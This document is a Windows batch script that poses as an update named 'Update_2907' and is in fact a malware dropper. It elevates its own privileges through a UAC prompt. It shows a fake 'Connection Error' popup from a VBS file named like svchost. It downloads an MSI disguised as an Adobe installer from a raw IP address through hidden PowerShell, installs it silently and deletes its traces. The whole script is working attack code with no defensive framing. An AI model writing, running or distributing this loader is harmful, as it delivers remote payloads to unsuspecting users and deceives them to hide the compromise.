@echo off
title Update_2907

:: --- Self-elevate (UAC prompt right after the brief CMD flash) ---
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "NpGTTie=%TEMP%"
set "LVmFE=%NpGTTie%\setup385.msi"
set "voGguFC=%NpGTTie%\svchost894.vbs"

:: --- Write a tiny VBS so the fake popup auto-times-out ---
> "%voGguFC%" echo Set s = CreateObject("WScript.Shell")
>>"%voGguFC%" echo s.Popup "The remote server is not responding.", 6, "Connection Error", 16

:: --- Show fake popup (non-blocking) ---
start "" wscript.exe "%voGguFC%"

:: --- Download the MSI via PowerShell WebClient ---
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('http://64.204.180.203:8040/Bin/Adobe.ClientSetup.msi?e=Access&y=Guest', '%LVmFE%')"

:: --- Install silently (blocks until msiexec finishes) ---
if exist "%LVmFE%" msiexec /i "%LVmFE%" /qn

:: --- Cleanup ---
timeout /t 5 /nobreak >nul
del "%LVmFE%" /q >nul 2>&1
del "%voGguFC%" /q >nul 2>&1
exit /b 0